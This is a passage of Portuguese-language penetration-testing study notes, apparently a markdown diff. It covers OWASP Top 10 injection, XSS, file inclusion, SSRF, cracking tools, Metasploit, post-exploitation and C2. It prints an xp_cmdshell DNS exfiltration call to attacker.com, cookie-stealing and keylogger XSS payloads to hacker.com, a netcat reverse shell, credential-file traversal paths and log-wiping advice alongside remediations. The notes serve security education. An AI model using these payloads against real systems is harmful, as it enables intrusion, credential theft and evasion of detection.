+-- MSSQL — xp_cmdshell (desabilitado por padrão em versões modernas):
+EXEC xp_cmdshell 'nslookup data.attacker.com';
+```
+Receptor: **Burp Collaborator**, [Interactsh](https://github.com/projectdiscovery/interactsh) (open-source) ou listener DNS/HTTP próprio.
+
+Limitações: requer acesso de rede de saída; payloads específicos por SGBD; DNS limitado a 63 chars por label.
+
+---
+
+#### Remediação
+1. **Prepared Statements (prioridade máxima):** separam estrutura SQL dos dados — entrada jamais altera a query.
+   ```php
+   // PHP vulnerável:
+   $query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
+
+   // Corrigido (PDO):
+   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+   $stmt->execute([$_POST['username']]);
+   ```
+   ```python
+   # Python vulnerável:
+   cursor.execute(f"SELECT * FROM users WHERE username='{username}'")
+
+   # Corrigido:
+   cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+   ```
+2. **Validação de entrada (allowlist):** definir o que é válido e rejeitar todo o resto. Nunca confiar apenas nisso — usar em conjunto com prepared statements.
+3. **Escape de entrada:** inserir `\` antes de caracteres especiais. Frágil (depende do SGBD) — usar apenas em código legado.
+4. **Princípio do menor privilégio:** conta de DB da aplicação só recebe `SELECT` se não precisar escrever. Nunca conectar como `root`/`sa`.
+5. **WAF:** inspeciona padrões (`UNION SELECT`, `information_schema`). Camada adicional, não substitui código seguro — contornável com codificação e ofuscação.
+
+---
+
+**SQLMap** (automatizado):
+```bash
+sqlmap -u <url> --dbs                                       # lista bancos
+sqlmap -u <url> -D banco --tables                           # lista tabelas
+sqlmap -u <url> -D banco -T tabela --columns                # lista colunas
+sqlmap -u <url> -D banco -T tabela --columns "c1,c2" --dump # extrai dados
+```
+Pode-se usar com cookie de sessão autenticada (via Burp Suite) quando a aplicação exige login.
+
+### 4.4.2 Command Injection
+Abuso de uma aplicação para executar comandos no SO com os privilégios do processo — também chamada RCE (Remote Code Execution).
+
+- **Blind**: sem saída direta — usar payloads de atraso (`ping`, `sleep`), redirecionamento (`>`) ou `curl` para confirmar execução.
+- **Verbose**: há feedback direto do comando injetado.
+
+Funções PHP vulneráveis comuns: `exec`, `passthru`, `system`. Mitigação: sanitização de entrada, uso mínimo de funções perigosas.
+
+### 4.4.3 Code Injection
+Termo genérico para injeção de código interpretado pela própria aplicação. Explora funções como `eval()` em PHP. A vulnerabilidade está restrita à linguagem usada (app PHP só aceita injeção PHP).
+
+Exemplo de exploração progressiva (PHP):
+```php
+eval("echo 'Mensagem. Nome $_GET[nome]';");
+```
+Ao injetar `?nome=X';phpinfo();//`, o interpretador fecha a string, executa `phpinfo()` e comenta o restante — provando execução de código arbitrário. Com `system('ls -la')` no mesmo espaço, obtém-se execução de comando no SO.
+
+Outros subtipos: **LDAP Injection** (manipula consultas LDAP), **XSS** (ver 4.4.4).
+
+### 4.4.4 Cross-Site Scripting (XSS)
+Injeção de JavaScript (ou outra linguagem client-side) em uma aplicação vulnerável, executado no navegador de outros usuários.
+
+**Payload — duas partes:**
+- **Intention**: o que o script deve fazer (PoC, roubo de sessão, keylogger).
+- **Modification**: ajustes para escapar do contexto (tag, atributo, bloco JS).
+
+**Tipos:**
+1. **Refletido (não persistente)**: entrada refletida imediatamente na resposta HTTP — exige entrega individual a cada vítima.
+2. **Armazenado (persistente)**: payload salvo no servidor (comentários, perfis, fóruns) e executado para todo visitante — o mais crítico.
+3. **Baseado em DOM**: execução inteiramente no cliente, manipulando `document.URL`, `location.hash` etc. — mais difícil de detectar.
+4. **Blind XSS**: como o armazenado, mas o atacante não vê o resultado diretamente — requer callback HTTP.
+
+**Exemplos de payload:**
+```html
+<script>alert('XSS')</script>                                                              <!-- PoC -->
+<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>       <!-- roubo de sessão -->
+<script>document.onkeypress = e => fetch('https://hacker.com/log?key=' + btoa(e.key));</script>  <!-- keylogger -->
+```
+
+**Bypass de filtros:**
+- `<sscriptcript>` — duplicar a palavra filtrada para que a remoção deixe a tag válida.
+- **Polyglot**: sequência capaz de escapar de atributos/tags e burlar múltiplos filtros.
+
+**Cabeçalhos de segurança relacionados:**
+- **CSP**: restringe de onde scripts/estilos podem ser carregados.
+- **HSTS**: força HTTPS.
+- **X-Content-Type-Options: nosniff**: impede adivinhação de MIME type.
+- **Referrer-Policy**: controla informações de referência enviadas ao navegar.
+
+### 4.4.5 File Inclusion (LFI / RFI / Path Traversal)
+Vulnerabilidade de aplicações que servem arquivos via parâmetros de URL sem validação adequada.
+
+**Path Traversal:** manipula a URL para acessar arquivos fora do diretório raiz.
+```
+?file=../../../../etc/passwd
+```
+
+Arquivos de teste comuns:
+- `/etc/passwd` — usuários do sistema (Linux)
+- `/etc/shadow` — hashes de senhas (Linux, requer root)
+- `/etc/issue` — versão do SO
+- `/proc/version` — versão do kernel
+- `/root/.bash_history` — histórico de comandos do root
+- `/root/.ssh/id_rsa` — chave SSH privada do root
+- `/var/log/apache2/access.log` — log de acesso do servidor web
+- `C:\boot.ini` — informações de boot (Windows)
+
+**LFI (Local File Inclusion):**
+- **Byte Null** (`%00`): encerra a string (eficaz em versões antigas de PHP).
+- Se `../` for filtrado, usar `....//` para contornar.
+- Se exigido um diretório específico: `?lang=languages/../../../../../etc/passwd`.
+
+**RFI (Remote File Inclusion):** injeta URL externa (requer `allow_url_fopen` ativo). O atacante hospeda um arquivo malicioso e o referencia no parâmetro vulnerável, levando a RCE.
+
+**Remediações:** manter sistema/frameworks atualizados; desativar mensagens de erro detalhadas; usar WAF; desabilitar `allow_url_fopen`/`allow_url_include`; validação com lista de permissões.
+
+---
+
+## 4.5 A04 — Design Inseguro
+
+Falhas de segurança decorrentes de ausência ou ineficácia de controles de segurança no próprio design da aplicação — não erros de implementação, mas decisões de projeto que criam superfícies de ataque estruturais.
+
+> ℹ️ Diferença essencial: **A04 Design Inseguro** trata de controles que nunca foram projetados. **A05 Configuração Incorreta** trata de controles projetados mas mal configurados.
+
+### Exemplos comuns de design inseguro
+- Fluxos de autenticação sem limite de tentativas no design (não só no código);
+- Ausência de separação de privilégios entre módulos desde a arquitetura;
+- Dados sensíveis transitando por etapas do fluxo sem necessidade;
+- APIs que expõem objetos completos em vez de projeções mínimas (overfetching);
+- Lógica de negócio que assume que o cliente sempre enviará dados válidos.
+
+### 4.5.1 Race Conditions
+
+Vulnerabilidade de temporização — múltiplas threads acessam e modificam o mesmo dado simultaneamente sem sincronização adequada (ex: aplicar desconto múltiplas vezes, sacar mais do que o saldo permite).
+
+Causas:
+- Execução paralela sem sincronização de recursos compartilhados;
+- Operações de banco de dados simultâneas (leitura-modificação-gravação);
+- Bibliotecas/serviços de terceiros sem tratamento adequado de concorrência.
+
+**Vulnerabilidade TOCTOU** (Time-of-Check to Time-of-Use): a thread verifica um valor, mas ele muda antes da ação ser executada.
+
+Ferramenta: **Burp Suite Repeater** (enviar requisições quase simultâneas para explorar a janela de tempo).
+
+**Mitigação:** mecanismos de sincronização (locks); operações atômicas (indivisíveis); transações de banco de dados (tudo ou nada).
+
+---
+
+## 4.6 A05 — Configuração Incorreta de Segurança
+
+Controles existem e foram projetados, mas estão mal configurados — categoria mais ampla do OWASP, presente em praticamente qualquer stack tecnológica.
+
+### Manifestações comuns
+- Credenciais padrão não alteradas (admin/admin, root/root);
+- Recursos ou funcionalidades desnecessárias habilitadas (serviços, portas, páginas de debug);
+- Mensagens de erro detalhadas exibidas ao usuário (stack traces, versões de framework);
+- Permissões excessivas em buckets S3, bancos de dados ou sistemas de arquivos;
+- Cabeçalhos de segurança HTTP ausentes (CSP, HSTS, X-Frame-Options);
+- Software desatualizado com configuração padrão de versão antiga;
+- CORS configurado com `*` (todas as origens permitidas);
+- Diretórios de aplicação com listagem habilitada.
+
+### 4.6.1 File Upload — Filtragem e Bypass
+
+Upload de arquivos sem validação adequada — configuração incorreta do servidor que permite tipos de arquivo maliciosos ou bypass das restrições existentes.
+
+**Tipos de validação do lado do servidor:**
+1. **Extensão do arquivo**: checagem simples, facilmente burlável;
+2. **MIME Type**: verificação via cabeçalho `Content-Type` — facilmente falsificável pelo atacante;
+3. **Magic Number**: sequência de bytes no início do arquivo (ex: PNG = `89 50 4E 47...`) — mais confiável que o MIME, mas ainda falsificável;
+4. **Comprimento do arquivo**: evita exaustão de recursos; geralmente não impede shells pequenos;
+5. **Nome do arquivo**: deve ser único e limpo de caracteres inválidos (null bytes, `;`, Unicode);
+6. **Conteúdo do arquivo**: escaneamento completo, mais raro e mais robusto.
+
+**Bypass de filtros client-side:**
+1. Desativar JavaScript do navegador;
+2. Interceptar e remover o filtro JS na página de entrada (Burp Suite);
+3. Interceptar e modificar o upload após passar pelo filtro;
+4. Enviar o arquivo diretamente ao endpoint com `curl`:
+```
+curl -X POST -F 'submit:<valor>' -F '<param_arquivo>:@<caminho>' <site>
+```
+
+---
+
+## 4.7 A06 — Componentes Vulneráveis e Desatualizados
+
+Uso de bibliotecas, frameworks, módulos, containers ou qualquer componente de software com vulnerabilidades conhecidas — frequentemente o vetor de ataques de supply chain.
+
+### Manifestações comuns
+- Bibliotecas JavaScript desatualizadas (jQuery, Log4j, Struts) com CVEs públicas;
+- Imagens Docker baseadas em versões antigas de SO ou runtime;
+- Dependências transitivas (dependências de dependências) não auditadas;
+- Componentes sem suporte ativo (end-of-life) ainda em produção;
+- Falta de inventário de componentes (SBOM — Software Bill of Materials).
+
+### Identificação em pentest
+- Analisar cabeçalhos HTTP (`Server`, `X-Powered-By`) para identificar versões;
+- Verificar arquivos `package.json`, `requirements.txt`, `pom.xml` expostos;
+- Comparar versões identificadas com [CVE](https://www.cve.org) / [NVD](https://nvd.nist.gov) / [Snyk](https://snyk.io);
+- Usar [Retire.js](https://retirejs.github.io/retire.js) para bibliotecas JavaScript;
+- Usar [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check) para análise de dependências.
+
+### Mitigação
+- Manter inventário atualizado de todos os componentes (SBOM);
+- Monitorar feeds de vulnerabilidades (NVD, GitHub Security Advisories);
+- Aplicar patches assim que disponíveis;
+- Remover dependências não utilizadas.
+
+---
+
+## 4.8 A07 — Falhas de Identificação e Autenticação
+
+Burlar login e mecanismos de autenticação para acesso não permitido — vulnerabilidade crítica, leva a vazamento de dados e comprometimento de contas.
+
+### Vetores de ataque
+- **Enumeração de usuários**: respostas diferentes para usuários válidos/inválidos (ex: "username already exists") — identificar via `ffuf`;
+- **Força bruta**: combinar wordlist de usuários e senhas (Hydra, Burp Intruder);
+- **Falha lógica**: fluxo da aplicação contornado (ex: acessar `/admin` diretamente);
+- **Cookie Tampering**: editar cookies de sessão (`admin=false` → `admin=true`).
+
+Valores de cookie podem estar em **hash** ([CrackStation](https://crackstation.net) para quebrar) ou **codificação** (base32/base64 — reversível, não exige força bruta).
+
+### Mitigação
+- Senhas complexas;
+- Não expor credenciais em GET;
+- JWT forte com validação de assinatura;
+- MFA;
+- Bloqueio de conta/captcha após tentativas excessivas;
+- Nunca salvar senha em texto puro;
+- Invalidar sessão no logout.
+
+---
+
+## 4.9 A08 — Falhas de Software e Integridade de Dados
+
+Código e infraestrutura que não protegem contra violações de integridade — inclui desserialização insegura, pipelines CI/CD sem verificação e atualizações automáticas sem assinatura.
+
+### 4.9.1 Desserialização Insegura
+
+**Serialização**: transforma uma estrutura de dados complexa (objeto) em bytes para armazenamento/transmissão — formatos legíveis (JSON, XML, YAML, PHP) ou binários (Java, pickle em Python).
+
+**Desserialização insegura** ocorre quando o usuário controla o objeto serializado e o processo de recuperação não é seguro, permitindo RCE ou elevação de privilégio.
+
+Exemplo clássico: cookie de sessão em Base64 contém um objeto serializado (`O:4:"Auth":3:{...;b:1;}`). Alterar o campo de ID ou o booleano, reencodar e substituir o cookie pode escalar privilégios ou assumir outra identidade.
+
+Como pentester: demonstrar elevação de privilégio (usuário comum → admin) e RCE via objeto malicioso são as duas provas de conceito mais usadas.
+
+### 4.9.2 Outros vetores de integridade
+- Pipelines CI/CD que executam código de PRs de forks sem revisão;
+- Dependências instaladas sem verificação de hash/assinatura;
+- Atualizações automáticas de bibliotecas sem pinagem de versão (ex: `latest`).
+
+---
+
+## 4.10 A09 — Falhas de Monitoramento e Registro
+
+Ausência ou insuficiência de logs, alertas e monitoramento — do ponto de vista ofensivo, é a categoria que o atacante **explora pela negativa**: gaps de monitoramento permitem que atividades maliciosas passem despercebidas por longos períodos.
+
+### O que o atacante busca (perspectiva Red Team)
+- Endpoints que não geram log de acesso (ex: APIs internas, endpoints esquecidos);
+- Ausência de alerta para múltiplas falhas de autenticação;
+- Logs sem registro de IP, user-agent ou payload das requisições;
+- Inexistência de correlação de eventos entre sistemas (sem SIEM);
+- Logs gravados localmente no mesmo sistema comprometido (possível adulteração).
+
+### Impacto
+Sem monitoramento adequado, um atacante pode persistir por semanas ou meses sem detecção — o tempo médio de detecção de intrusões (dwell time) é historicamente medido em dezenas de dias.
+
+### Controles defensivos relacionados
+Ver **Parte 9 — Blue Team**: SOC, SIEM, IDS/IPS, gestão de logs e Event IDs do Windows.
+
+---
+
+## 4.11 A10 — SSRF (Server-Side Request Forgery)
+
+Permite que um invasor faça o servidor web enviar requisições HTTP adicionais/editadas a um destino de sua escolha.
+
+- **Regular SSRF**: dados retornados ao invasor.
+- **Blind SSRF**: nenhuma informação retornada — requer ferramenta de log HTTP externo ([requestbin.com](https://requestbin.com), Burp Collaborator).
+
+**Impactos:** acesso a áreas internas, dados de outros clientes, escalada para redes internas, vazamento de tokens, bypass de firewall.
+
+**Onde procurar:**
+- URL completa em parâmetro;
+- Campo oculto HTML;
+- URL parcial (hostname);
+- Apenas caminho de URL.
+
+### Proteções e como contorná-las
+- **Deny list:** bloqueia padrões específicos (ex: `localhost`, `127.0.0.1`).
+  - **Bypass:**
+    - **Referências alternativas:**
+      - `0`
+      - `0.0.0.0`
+      - `127.1`
+      - `2130706433` (decimal)
+      - `127.0.0.1.nip.io`
+    - **nuvem:**
+      - `169.254.169.254` (metadados) é alvo clássico.
+- **Allow list:** só permite padrão específico (ex: `https://site.com`).
+  - **Bypass:** criar subdomínio no domínio do atacante (`site.com.attacker.com`).
+- **Open Redirect:** endpoint que redireciona automaticamente — pode ser abusado para desviar a validação.
+
+---
+
+## 4.12 OWASP API Security Top 10 (resumo)
+
+> Lista independente do OWASP Top 10 Web, focada em APIs. Ver **Parte 8** para detalhamento completo.
+
+1. **BOLA** (Broken Object Level Authorization)
+   - **Como é explorado:** equivalente a IDOR em APIs — acesso a objetos de outros usuários manipulando IDs.
+   - **Como mitigar:** autorização baseada em política e tokens aleatórios fortes.
+
+2. **BUA** (Broken User Authentication)
+   - **Como é explorado:** autenticação mal implementada — credenciais fracas, tokens previsíveis, ausência de MFA.
+   - **Como mitigar:** MFA, JWT forte, bloqueio de conta.
+
+3. **Excessive Data Exposure**
+   - **Como é explorado:** API retorna mais dados que o necessário; cliente filtra no front-end.
+   - **Como mitigar:** nunca deixar a filtragem para o front-end; retornar apenas campos necessários.
+
+4. **Lack of Resources & Rate Limiting**
+   - **Como é explorado:** sem limite de requisições — leva a DoS, brute force ou scraping massivo.
+   - **Como mitigar:** captcha e limite de taxa (rate limiting).
+
+5. **Broken Function Level Authorization**
+   - **Como é explorado:** usuário comum executa ação administrativa acessando endpoints privilegiados.
+   - **Como mitigar:** negar acesso por padrão e revisar hierarquia de grupos.
+
+---
+
+## 4.13 Devtools — Aba Storage (ferramenta de inspeção no navegador)
+
+- **Local Storage**: persiste mesmo após fechar o navegador.
+- **Session Storage**: temporário, por aba/sessão.
+- **Cookies**: usados para sessão/autenticação; flags `HttpOnly` (bloqueia acesso via JS, mitiga XSS), `Secure` (só via HTTPS), `SameSite` (mitiga CSRF).
+- **Cache Storage**: recursos em cache (imagens, scripts, respostas de API).
+
+
+---
+
+# Ferramentas Ofensivas
+
+*Nível: Intermediário a Avançado.*
+
+## 5.1 Burp Suite
+
+### Intruder — Tipos de ataque
+- **Sniper**: insere um payload por vez em cada posição (iteração linear). Ideal para força bruta de posição única. Total de requisições = nº de palavras × nº de posições.
+- **Battering Ram**: envia a mesma carga em todas as posições simultaneamente — útil para testar Race Conditions.
+- **Pitchfork**: testa múltiplas posições simultaneamente, cada uma com seu próprio conjunto de payloads (até 20) — bom para credential stuffing.
+- **Cluster Bomb**: combina Sniper + Pitchfork, testando todas as combinações possíveis entre conjuntos de payload.
+
+### Outros módulos
+- **Decoder**: codifica/decodifica dados (Base64, URL, etc.).
+- **Comparer**: compara dois trechos de dados (ASCII ou byte a byte).
+- **Sequencer**: avalia a entropia/aleatoriedade de tokens (sessão, CSRF) — entropia efetiva alta (ex: 117 bits) indica token seguro contra força bruta/previsão.
+- **Organizer**: armazena e anota requisições HTTP relevantes para o relatório final.
+- **Extensions**: escritas em Java (nativo) ou Python (requer Jython), distribuídas via BApp Store.
+
+## 5.2 SQLMap
+Ver seção 4.4 (Injeção) para sintaxe detalhada.
+
+## 5.3 Hydra
+Ferramenta de quebra de senha online por força bruta, suporta dezenas de protocolos (FTP, SSH, SMB, RDP, HTTP-FORM, SMTP, IMAP, MySQL, VNC etc.).
+
+```
+hydra -l usuario -P wordlist.txt ftp://IP
+hydra -l usuario -P wordlist -t 4 IP ssh
+hydra -l usuario -P wordlist IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+- `-l` (minúsculo): usuário único | `-L`: lista de usuários.
+- `-P`: lista de senhas.
+- `-t`: número de threads.
+- `-V`: saída detalhada por tentativa.
+- Para formulários web: é preciso conhecer o endpoint, os nomes dos campos (via inspeção de requisição) e a mensagem de erro de login inválido.
+
+## 5.4 John the Ripper / Hashcat
+
+### John the Ripper
+```
+john --format=raw-md5 --wordlist=rockyou.txt hash_to_crack.txt
+john --single --format=raw-sha256 hashes.txt        # modo single (baseado no nome de usuário)
+unshadow passwd shadow > unshadowed.txt              # combina passwd+shadow do Linux
+zip2john arquivo.zip > hash.txt                      # extrai hash de ZIP
+rar2john arquivo.rar > hash.txt                      # extrai hash de RAR
+ssh2john id_rsa > hash.txt                           # extrai hash de chave SSH privada
+```
+Regras personalizadas em `john.conf` (`[List.Rules:Nome]`) permitem mutações como capitalizar, adicionar sufixo numérico/símbolo etc.
+
+### Hashcat
+```
+hashcat -m <tipo_hash> -a <modo_ataque> hashfile wordlist
+```
+`-m 1000` = NTLM, por exemplo. `-a 0` = ataque direto (wordlist). Consultar `hashcat --help` ou wiki para o código do tipo de hash.
+
+Outras ferramentas de quebra: **Medusa**, **Ophcrack**, serviços online ([CrackStation](https://crackstation.net), [hashes.com](https://hashes.com)).
+
+## 5.5 Metasploit Framework
+
+Framework de exploração que cobre todas as fases do pentest, da coleta de informação à pós-exploração.
+
+```
+msfconsole                 # inicia o console
+search <termo/CVE>          # busca exploits/payloads/módulos
+use <módulo>                 # seleciona módulo
+set PARAMETRO valor          # configura parâmetro
+setg PARAMETRO valor          # configura globalmente (mantém entre módulos)
+show options                 # mostra parâmetros
+show payloads                 # mostra payloads disponíveis
+exploit / run                 # executa
+exploit -z                    # executa e coloca sessão em background
+sessions                     # lista sessões ativas
+sessions -i N                 # interage com sessão N
+background                    # volta ao prompt sem encerrar sessão
+back                          # volta ao contexto anterior
+```
+
+### Estrutura de diretórios/tipos
+- **Auxiliary**: scanners, crawlers, fuzzers (módulos de apoio).
+- **Encoders**: codificam payloads tentando evadir AV baseado em assinatura.
+- **Evasion**: tentam burlar diretamente o antivírus.
+- **Exploits**: organizados por sistema alvo.
+- **NOPs**: instrução "sem operação" (`0x90`), usada como buffer de alinhamento.
+- **Payloads**: código executado no alvo — subdividido em Adapters, Singles (independentes), Stagers (canal de conexão) e Stages (baixados pelo stager, permitem payloads maiores).
+
+Nomenclatura: `generic/shell_reverse_tcp` (inline/single, indicado por `_`) vs `windows/x64/shell/reverse_tcp` (staged, indicado por `/`).
+
+### Parâmetros principais
+`RHOST`/`RHOSTS` (alvo), `RPORT` (porta remota), `LHOST`/`LPORT` (atacante), `PAYLOAD`, `SESSION`.
+
+### Classificação de confiabilidade dos exploits
+Excellent > Great > Good > Normal > Average > Low > Manual.
+
+### Varredura integrada
+`db_nmap` integra resultados do Nmap ao banco de dados do Metasploit. Módulos de `portscan` (CONCURRENCY, PORTS, RHOSTS, THREADS) e `scanner/discovery/udp_sweep` (identifica DNS/NetBIOS via UDP rapidamente).
+
+### Meterpreter (shell avançado pós-exploração)
+```
+ps                # processos em execução
+systeminfo         # info do sistema
+shell              # cmd nativo do Windows
+sessions -l 1      # retorna ao meterpreter de uma sessão
+```
+Permite: printscreen remoto, upload/download, dump de credenciais de memória, escalonamento de privilégios.
+
+### MSFVenom
+Cria e codifica payloads em diversos formatos (PHP, EXE, DLL, ELF) para diversos alvos (Windows, Linux, Android, Apple).
+
+## 5.6 CyberChef
+Aplicativo web "canivete suíço" para dados — codificação/decodificação (XOR, Base64), criptografia (AES, RSA). Áreas: Operations (menu de ações), Recipe (pipeline de operações), Input, Output. Disponível [online](https://gchq.github.io/CyberChef) ou offline.
+
+## 5.7 Outras ferramentas úteis (referência rápida)
+
+| Ferramenta | Uso |
+|---|---|
+| [Shodan](https://www.shodan.io) | Busca de dispositivos conectados à internet |
+| [VirusTotal](https://www.virustotal.com) | Consenso de +70 antivírus sobre arquivos/links |
+| Crunch | Geração de wordlists customizadas |
+| Foxyproxy | Gerenciamento de proxies no navegador |
+| [securityheaders.com](https://securityheaders.com) | Análise de cabeçalhos de segurança de um site |
+| [srihash.org](https://www.srihash.org) | Gera hash de integridade de bibliotecas (SRI) |
+| [ipleak.net](https://ipleak.net) | Mapeia dados expostos pelo navegador |
+| [github-dorks](https://github.com/techgaun/github-dorks) / [exploit-db GHDB](https://www.exploit-db.com/google-hacking-database) | Dorks específicas para GitHub e Google |
+| [dorkgenius.com](https://dorkgenius.com) | IA geradora de dorks |
+| User-Agent Switcher / ProtonVPN | Anonimização |
+
+
+---
+
+# Exploração e Pós-Exploração
+
+*Nível: Avançado.*
+
+## 6.1 Exploitation — Fundamentos
+
+É essencial organizar os dados obtidos nas fases anteriores (Information Gathering, Enumeração, Scanning) antes de tentar explorar — não basta conhecer técnicas isoladas, é preciso ligar a informação correta ao processo correto.
+
+Conceitos:
+- **Exploit**: meio pelo qual um atacante tira vantagem de uma falha, transformando uma vulnerabilidade em acesso.
+- **Payload**: código que o sistema deve executar.
+- **Shellcode**: conjunto de instruções usadas como payload no momento da exploração.
+- **Module**: pequeno software (ex: no Metasploit) que conduz o ataque.
+
+Bases de referência: [cve.org](https://www.cve.org), [cvedetails.com](https://www.cvedetails.com), [vuldb.com](https://vuldb.com), [rapid7.com](https://www.rapid7.com/db), [exploit-db.com](https://www.exploit-db.com), [book.hacktricks.wiki](https://book.hacktricks.wiki).
+
+## 6.2 Shells (Reverse, Bind, Web)
+
+### Reverse Shell ("connect back shell")
+A conexão parte do alvo em direção à máquina do atacante — ajuda a evitar detecção por firewalls de rede (tráfego de saída costuma ser menos monitorado).
+
+Exemplo conceitual com Netcat (pipe reverse shell):
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATACANTE_IP PORTA > /tmp/f
+```
+O atacante fica em modo de escuta: `nc -nlvp PORTA`.
+
+### Bind Shell
+A máquina alvo abre uma porta e aguarda a conexão do atacante. Útil quando o alvo não permite conexões de saída, mas é menos popular (precisa ficar ativo monitorando, maior chance de detecção).
+```
+nc -nv TARGET_IP PORTA   # do lado do atacante
+```
+
+### Web Shell
+Script (PHP, ASP, JSP, CGI) hospedado em um servidor web comprometido, executando comandos através do próprio servidor — difícil de detectar por estar oculto dentro de um app/serviço legítimo.
+
+## 6.3 Pós-exploração — Linux
+
+Objetivo: verificar possibilidades no alvo (outros usuários, redes conectadas, dados exfiltráveis, escalonamento de privilégio).
+
+```
+whoami                                    # usuário atual
+hostname                                   # nome do host
+cat /etc/passwd                            # todos os usuários
+ls -liah /etc/passwd                       # checar permissão de escrita (inserir usuário root?)
+find / -perm -u=s -type f 2>/dev/null      # binários com SUID
+find / -perm -g=s -type f 2>/dev/null      # binários com SGID
+sudo -l                                    # permissões sudo do usuário atual
+find / -writable -type d 2>/dev/null       # diretórios com permissão de escrita
+ps aux                                     # processos em execução
+cat ~/.ssh/authorized_keys                 # chaves SSH
+cat /etc/*-release; cat /etc/issue         # versão do SO (buscar CVEs de kernel)
+cat /etc/crontab                           # tarefas agendadas
+netstat -tunap                             # conexões ativas (pivoting/movimentação lateral)
+```
+
+### Melhoria do shell recebido
+```
+python -c 'import pty;pty.spawn("/bin/bash")'    # upgrade básico na máquina alvo
+```
+A ferramenta **pwncat-cs** melhora a interação entre shell local e remoto na escuta.
+
+### Pivoting
+Se o host comprometido tiver conexões com outras máquinas (via `netstat`), é possível expor a porta do serviço interno para o atacante usando técnicas como **Chisel** (precisa estar presente tanto local quanto remotamente — transferir para diretório com permissão de escrita, como `/tmp`) ou **rsocx**, **SSH**, **proxychains4**.
+
+### Backdoor e limpeza de rastros
+Persistência via crontab (bind/reverse shell agendado); limpeza de logs após a atividade para reduzir rastros.
+
+## 6.4 Pós-exploração — Windows
+
+### Transferência de arquivos
+Via SMB (Impacket), HTTP, FTP.
+
+### Escalação manual de privilégios
+Verificar: `systeminfo`, usuários e grupos, configuração de rede, serviços em execução, regras de firewall, tarefas agendadas, permissões de arquivo/pasta, AutoElevate, drivers instalados.
+
+**Insecure Service Permissions / Unquoted Service Path**: um exemplo clássico de escalação — se o caminho do executável de um serviço não está entre aspas e contém espaços, o Windows tenta executar cada segmento do caminho como se fosse um executável separado, permitindo que um atacante plante um executável malicioso em um diretório intermediário.
+
+### Escalação automatizada
+- **[WinPEAS](https://github.com/carlospolop/PEASS-ng)** / **[Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)**: enumeram automaticamente vetores de escalação.
+- Módulo **keylogger** do Metasploit.
+
+### Backdoor
+Persistência via `schtasks` (tarefas agendadas).
+
+### Pivoting
+**[Chisel](https://github.com/jpillora/chisel)** também aplicável em ambiente Windows.
+
+### Limpeza de logs
+Remoção/edição de logs de eventos para reduzir rastro da operação.
+
+## 6.5 Comando e Controle (C2) e Botnets
+
+**C2** (termo com origem militar, Guerra Fria) define a infraestrutura de controle de ativos comprometidos. Em sua forma básica, um nó central distribui comandos aos ativos infectados (bots), que retornam dados.
+
+### Elementos de uma Botnet
+- **Bot**: host infectado.
+- **Botmaster**: controlador da botnet.
+- **Serviço C2**: ponto de conexão entre botmaster e bots.
+
+### Objetivos comuns de uma botnet
+- Obtenção de informações (credenciais, arquivos, tráfego)
+- Ataques DDoS coordenados
+- Encaminhamento de SPAM
+- Anonimização (redirecionar tráfego do atacante através dos ativos infectados)
+
+### Topologias
+- **Centralizada**: um único servidor C2 — mais fácil de desestruturar (um ponto de falha).
+- **Descentralizada**: múltiplos servidores C2 — resiliente, botmaster inclui novos servidores para persistência.
+- **P2P**: qualquer nó pode transmitir comandos — não depende de um nó C2 exclusivo, mais resiliente de todas.
+
+### Canais de exfiltração/comando
+Sites de hospedagem de texto (Pastebin, GitHub — comandos encodados, removidos assim que identificados); protocolos **DNS** (requisições TXT com dados encodados em hex) e **ICMP** (dados no payload do pacote) — ambos exploram protocolos raramente bloqueados.
+
+### Tipos de conexão
+- **Bind**: o host controlado abre porta e aguarda conexão do C2.
+- **Reverse**: o host controlado conecta-se ativamente ao C2 — menos provável de ser bloqueada por firewall (parece tráfego de saída legítimo), funciona mesmo atrás de NAT.
+
+### Ferramentas de C2 além do Metasploit
+[Empire](https://github.com/BC-SECURITY/Empire), [CobaltStrike](https://www.cobaltstrike.com), [Covenant](https://github.com/cobbr/Covenant), [PoshC2](https://github.com/nettitude/PoshC2), [Octopus C2](https://github.com/mhaskar/Octopus), [PupyRAT](https://github.com/n1nj4sec/pupy).
+
+
+---
+
+# Exploração Binária (Avançado)
+
+*Nível: Muito avançado. Requer domínio de arquitetura de computadores e Assembly.*
+
+## 7.1 Fundamentos de Arquitetura x86
+
+A maioria dos computadores segue a **arquitetura de Von Neumann**, com três componentes principais:
+- **CPU**: executa o código dos programas. Internamente possui a Unidade de Controle (coordena execução via o registrador EIP), Registradores (armazenamento ultrarrápido) e ALU (Unidade Lógica e Aritmética).
+- **Memória Principal (RAM)**: armazena dados e código em processamento.
+- **Sistema de E/S**: interface com dispositivos (disco, teclado, monitor).
+
+### Registradores
+Local de armazenamento mais rápido disponível à CPU. Quatro categorias: uso geral, segmentados (mapeiam seções de memória), flags de status (decisões), ponteiros de instrução.
+
+Os 8 registradores de uso geral: **AX** (acumulador), **CX** (contador/loops), **DX** (dados, E/S), **BX** (ponteiro de dados), **SP** (topo da pilha), **BP** (base da pilha), **SI** (origem em fluxo), **DI** (destino em fluxo).
+
+### EIP (Extended Instruction Pointer)
+Contém o endereço da próxima instrução a ser executada — é o alvo clássico de um buffer overflow: se o atacante controla o EIP, controla o que a CPU executa a seguir.
+
+### Pilha (Stack)
+Estrutura **LIFO** (último que entra, primeiro que sai) usada para armazenamento de curto prazo — variáveis locais, parâmetros, endereços de retorno.
+
+### Assembly x86 — instruções essenciais
+- **NOP** (`0x90`): não faz nada — usado para preencher espaços/alinhar shellcode.
+- **CALL**: chama uma função, empilhando o endereço de retorno.
+- **RET**: usa o endereço do topo da pilha como próxima instrução — se for controlado pelo atacante, desvia o fluxo.
+- **JMP**: salta para o endereço de destino.
+- **PUSH**: armazena conteúdo na pilha.
+- **POP**: remove conteúdo da pilha para um registrador.
+
+### Operandos e Endianness
+Três tipos de operando: **imediato** (valor fixo), **registrador**, **endereço de memória**. A arquitetura x86 usa **little-endian** (byte menos significativo primeiro) — crucial ao construir um endereço de retorno manualmente para um exploit.
+
+## 7.2 Buffer Overflow — Conceito
+
